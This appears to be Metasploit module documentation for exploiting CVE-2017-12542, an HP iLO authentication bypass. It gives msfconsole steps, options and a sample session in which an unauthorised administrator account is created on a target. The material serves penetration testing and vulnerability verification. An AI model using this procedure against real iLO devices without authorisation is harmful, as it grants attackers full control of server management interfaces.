This module exploits the CVE-2017-12542 for authentication bypass on HP iLO, which is 100% stable when exploited this way, to create an arbitrary administrator account.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/admin/hp/hp_ilo_create_admin_account`
3. Set `RHOST`
4. run `check` to check if remote host is vulnerable (module tries to list accounts using the REST API)
5. Set `USERNAME` and `PASSWORD` to specify a new administrator account credentials
6. run `run` to actually create the account on the iLO

## Options

  **USERNAME**

  The username of the new administrator account. Defaults to a random string.

  **PASSWORD**

  The password of the new administrator account. Defaults to a random string.

## Scenarios

### New administrator account creation

```
msf > use auxiliary/admin/hp/hp_ilo_create_admin_account 
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > set RHOST 192.168.42.78
RHOST => 192.168.42.78
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > check
[+] 192.168.42.78:443 The target is vulnerable.
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > set USERNAME test_user
USERNAME => test_user
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > set PASSWORD test_password
PASSWORD => test_password
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > run

[*] Trying to create account test_user...
[+] Account test_user/test_password created successfully.
[*] Auxiliary module execution completed
msf auxiliary(admin/hp/hp_ilo_create_admin_account) > 
```